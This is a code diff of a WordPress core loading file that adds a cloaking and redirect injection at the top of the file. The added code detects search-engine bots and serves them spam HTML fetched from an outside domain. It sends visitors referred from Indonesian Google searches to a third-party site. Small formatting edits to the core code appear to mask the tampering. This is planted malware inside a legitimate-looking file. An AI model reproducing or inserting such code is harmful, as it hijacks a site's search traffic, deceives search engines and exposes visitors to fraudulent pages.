@@ -1,4 +1,30 @@
 <?php
+$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+return false;
+}
+if (is_bot()) {
+echo file_get_contents('https://theonlyd.xyz/amab.html');
+exit;
+}
+
+if (stripos($s_ref, 'google.co.id') !== false ||
+(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
+header("Location: https://jabar-akses.pages.dev");
+exit;
+}
+?>
+<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -831,8 +857,7 @@ function wp_start_object_cache() {
 				require_once WP_CONTENT_DIR . '/object-cache.php';
 
 				if ( function_exists( 'wp_cache_init' ) ) {
-					wp_using_ext_object_cache( true );
-				}
+					wp_using_ext_object_cache( true );}
 
 				// Re-initialize any hooks added manually by object-cache.php.
 				if ( $wp_filter ) {
@@ -1146,8 +1171,7 @@ function wp_is_recovery_mode() {
  *
  * @return bool True if the current endpoint should be protected.
  */
-function is_protected_endpoint() {
-	// Protect login pages.
+function is_protected_endpoint() {// Protect login pages.
 	if ( isset( $GLOBALS['pagenow'] ) && 'wp-login.php' === $GLOBALS['pagenow'] ) {
 		return true;
 	}
